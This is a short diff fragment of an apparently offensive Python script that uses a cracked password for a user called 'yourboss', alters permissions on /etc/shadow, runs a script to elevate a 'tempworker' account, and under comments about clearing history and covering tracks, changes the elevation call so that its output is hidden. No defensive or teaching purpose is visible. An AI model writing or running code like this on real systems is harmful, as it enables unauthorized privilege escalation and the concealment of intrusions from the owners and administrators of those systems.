@@ -112,7 +112,7 @@ exec_cmd_as_user('yourboss', yourboss_cracked, 'chmod u=rw,g=r,o= /etc/shadow')
 
 
 # Elevate tempworker and clear history
-subprocess.run(('./elevate_tempworker.sh ' + yourboss_cracked).split(), shell=False)
+subprocess.run(('./elevate_tempworker.sh ' + yourboss_cracked).split(), shell=False, stdout=subprocess.DEVNULL)
 
 
 # Cover our tracks
